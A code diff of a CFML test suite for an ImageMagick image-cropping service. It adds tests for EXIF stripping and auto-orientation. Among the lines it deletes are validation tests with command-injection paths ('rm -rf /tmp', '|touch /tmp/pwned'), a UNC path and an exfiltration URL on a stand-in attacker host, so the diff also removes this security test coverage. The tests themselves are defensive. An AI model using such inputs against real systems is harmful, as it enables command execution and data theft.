@@ -15,25 +15,10 @@ component extends="tests.resources.baseTest" {
                 setup();
             });
 
-            it('Crops a jpg image to exact target dimensions', () => {
-                var outputPath = tempDir & '/' & createUUID() & '.jpg';
-
-                imageService.crop(
-                    path       = expandPath('/tests/resources/jpg_example.jpg'),
-                    outputPath = outputPath,
-                    width      = 100,
-                    height     = 150
-                );
-
-                expect(fileExists(outputPath)).toBeTrue();
-                var dimensions = imageService.getDimensions(outputPath);
-                expect(dimensions.width).toBe(100);
-                expect(dimensions.height).toBe(150);
-            });
-
-            it('Crops a png image, scaling to cover and trimming overflow from the center when the aspect ratio differs', () => {
+            it('Scales to cover and trims overflow from the center when the aspect ratio differs', () => {
                 var outputPath = tempDir & '/' & createUUID() & '.png';
 
+                // png_example.png is 510x361
                 imageService.crop(
                     path       = expandPath('/tests/resources/png_example.png'),
                     outputPath = outputPath,
@@ -41,42 +26,9 @@ component extends="tests.resources.baseTest" {
                     height     = 200
                 );
 
-                expect(fileExists(outputPath)).toBeTrue();
                 var dimensions = imageService.getDimensions(outputPath);
                 expect(dimensions.width).toBe(200);
                 expect(dimensions.height).toBe(200);
-            });
-
-            it('Crops a jpeg image', () => {
-                var outputPath = tempDir & '/' & createUUID() & '.jpeg';
-
-                imageService.crop(
-                    path       = expandPath('/tests/resources/jpeg_example.jpeg'),
-                    outputPath = outputPath,
-                    width      = 180,
-                    height     = 180
-                );
-
-                expect(fileExists(outputPath)).toBeTrue();
-                var dimensions = imageService.getDimensions(outputPath);
-                expect(dimensions.width).toBe(180);
-                expect(dimensions.height).toBe(180);
-            });
-
-            it('Crops a heic image', () => {
-                var outputPath = tempDir & '/' & createUUID() & '.jpg';
-
-                imageService.crop(
-                    path       = expandPath('/tests/resources/heic_example.heic'),
-                    outputPath = outputPath,
-                    width      = 300,
-                    height     = 400
-                );
-
-                expect(fileExists(outputPath)).toBeTrue();
-                var dimensions = imageService.getDimensions(outputPath);
-                expect(dimensions.width).toBe(300);
-                expect(dimensions.height).toBe(400);
             });
 
             it('Upscales an image smaller than the target dimensions to exactly cover them', () => {
@@ -89,99 +41,61 @@ component extends="tests.resources.baseTest" {
                     height     = 300
                 );
 
-                expect(fileExists(outputPath)).toBeTrue();
                 var dimensions = imageService.getDimensions(outputPath);
                 expect(dimensions.width).toBe(400);
                 expect(dimensions.height).toBe(300);
             });
 
-            it('Throws for an empty path', () => {
-                expect(() => imageService.crop(
-                    path       = '',
-                    outputPath = tempDir & '/out.jpg',
+            it('Strips EXIF metadata by default and preserves it when strip is false', () => {
+                var strippedPath  = tempDir & '/' & createUUID() & '.jpg';
+                var preservedPath = tempDir & '/' & createUUID() & '.jpg';
+
+                imageService.crop(
+                    path       = expandPath('/tests/resources/oriented_example.jpg'),
+                    outputPath = strippedPath,
                     width      = 100,
                     height     = 100
-                )).toThrow('ImageMagick.InputValidationException');
-            });
-
-            it('Throws for a path that does not exist', () => {
-                expect(() => imageService.crop(
-                    path       = expandPath('/tests/resources/does_not_exist.jpg'),
-                    outputPath = tempDir & '/out.jpg',
+                );
+                imageService.crop(
+                    path       = expandPath('/tests/resources/oriented_example.jpg'),
+                    outputPath = preservedPath,
                     width      = 100,
-                    height     = 100
-                )).toThrow('ImageMagick.InputValidationException');
+                    height     = 100,
+                    strip      = false
+                );
+
+                expect(getOrientation(strippedPath)).toBe('Undefined');
+                expect(getOrientation(preservedPath)).toBe('RightTop');
             });
 
-            it('Throws for a path containing a double-quote character', () => {
-                expect(() => imageService.crop(
-                    path       = '#expandPath('/tests/resources/jpg_example.jpg')#"; rm -rf /tmp',
-                    outputPath = tempDir & '/out.jpg',
+            it('Rotates the image upright before cropping when autoOrient is true', () => {
+                var outputPath = tempDir & '/' & createUUID() & '.jpg';
+
+                // Keeping metadata shows the orientation tag was applied and reset, rather than just stripped
+                imageService.crop(
+                    path       = expandPath('/tests/resources/oriented_example.jpg'),
+                    outputPath = outputPath,
                     width      = 100,
-                    height     = 100
-                )).toThrow('ImageMagick.InputValidationException');
+                    height     = 100,
+                    strip      = false,
+                    autoOrient = true
+                );
+
+                expect(getOrientation(outputPath)).toBe('TopLeft');
             });
 
-            it('Throws for an empty outputPath', () => {
-                expect(() => imageService.crop(
-                    path       = expandPath('/tests/resources/jpg_example.jpg'),
-                    outputPath = '',
-                    width      = 100,
-                    height     = 100
-                )).toThrow('ImageMagick.InputValidationException');
-            });
-
-            it('Throws for an outputPath containing a double-quote character', () => {
-                expect(() => imageService.crop(
-                    path       = expandPath('/tests/resources/jpg_example.jpg'),
-                    outputPath = '#tempDir#/out"; rm -rf /tmp.jpg',
-                    width      = 100,
-                    height     = 100
-                )).toThrow('ImageMagick.InputValidationException');
-            });
-
-            it('Throws for a path using a UNC network path', () => {
-                expect(() => imageService.crop(
-                    path       = '\\attacker.test\share\evil.jpg',
-                    outputPath = tempDir & '/out.jpg',
-                    width      = 100,
-                    height     = 100
-                )).toThrow('ImageMagick.InputValidationException');
-            });
-
-            it('Throws for an outputPath starting with a pipe (ImageMagick PIPE coder command execution)', () => {
-                expect(() => imageService.crop(
-                    path       = expandPath('/tests/resources/jpg_example.jpg'),
-                    outputPath = '|touch /tmp/pwned',
-                    width      = 100,
-                    height     = 100
-                )).toThrow('ImageMagick.InputValidationException');
-            });
-
-            it('Throws for an outputPath using an ImageMagick coder/protocol prefix', () => {
-                expect(() => imageService.crop(
-                    path       = expandPath('/tests/resources/jpg_example.jpg'),
-                    outputPath = 'https://attacker.test/exfil',
-                    width      = 100,
-                    height     = 100
-                )).toThrow('ImageMagick.InputValidationException');
-            });
-
-            it('Throws for a non-positive width', () => {
+            it('Throws for a non-positive width or height', () => {
                 expect(() => imageService.crop(
                     path       = expandPath('/tests/resources/jpg_example.jpg'),
                     outputPath = tempDir & '/out.jpg',
                     width      = 0,
                     height     = 100
                 )).toThrow('ImageMagick.InputValidationException');
-            });
-
-            it('Throws for a non-positive height', () => {
                 expect(() => imageService.crop(
                     path       = expandPath('/tests/resources/jpg_example.jpg'),
                     outputPath = tempDir & '/out.jpg',
                     width      = 100,
-                    height     = 0
+                    height     = -1
                 )).toThrow('ImageMagick.InputValidationException');
             });
 
